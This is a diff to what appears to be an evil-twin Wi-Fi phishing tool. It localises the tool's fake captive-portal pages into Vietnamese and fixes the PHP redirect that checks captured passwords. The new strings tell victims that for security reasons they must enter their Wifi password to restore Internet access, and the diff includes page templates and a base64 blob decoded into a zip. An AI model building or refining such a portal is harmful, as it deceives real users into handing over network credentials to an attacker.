@@ -241,9 +241,9 @@ DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss kürzer als 64 Zeichen sein"
 DIALOG_WEB_INFO_ENG="Vì lý do bảo mật, hãy nhập <b>"$Host_ENC"</b> mật khẩu Wifi để xác thực truy cập Internet"
 DIALOG_WEB_INPUT_ENG="Mật khẩu Wifi:"
 DIALOG_WEB_SUBMIT_ENG="Hoàn thành"
-DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Lỗi</font>:</b> Mật khẩu bạn vừa nhập <b>NOT</b> không đúng!</b>"
+DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Lỗi</font>:</b> Mật khẩu bạn vừa nhập không đúng!</b>"
 DIALOG_WEB_OK_ENG="Kết nối mạng Internet sẽ được hoàn thành xác thực trong giây lát."
-DIALOG_WEB_BACK_ENG="$general_back"
+DIALOG_WEB_BACK_ENG="Quay lại"
 DIALOG_WEB_LENGHT_MIN_ENG="Mật khẩu phải dài từ 8 ký tự trở lên"
 DIALOG_WEB_LENGHT_MAX_ENG="Mật khẩu phải dài từ 64 ký tự trở xuống"
 
@@ -3684,11 +3684,11 @@ while(1)
 {
 
 if (file_get_contents(\"\$intento\") == 2) {
-	    top(\"location:final.html\");
+	    header(\"location:final.html\");
 	    break;
 	}
 if (file_get_contents(\"\$intento\") == 1) {
-	    top(\"location:error.html\");
+	    header(\"location:error.html\");
 	    unlink(\$intento);
 	    break;
 	}
@@ -6844,6 +6844,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	<html>
 	<head>
 	    <title>Login</title>
+		<meta charset=\"UTF-8\">
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
 	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
@@ -6857,7 +6858,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
 		<div data-role=\"top\" data-theme=\"a\">
-		    <h3>Login Page</h3>
+		    <h3>Xác thực</h3>
 		</div>
 
 		<div data-role=\"content\">
@@ -6888,6 +6889,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	<html>
 	<head>
 	    <title>Login</title>
+		<meta charset=\"UTF-8\">
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
 	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
@@ -6896,7 +6898,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
 		<div data-role=\"top\" data-theme=\"a\">
-		    <h3>Login Page</h3>
+		    <h3>Xác thực</h3>
 		</div>
 
 		<div data-role=\"content\">
@@ -6930,7 +6932,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	echo "<!DOCTYPE html>
 	<html>
 	<head>
-	    <title>Login</title>
+	    <title>Xác thực kết nối Wifi</title>
 		<meta charset=\"UTF-8\">
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
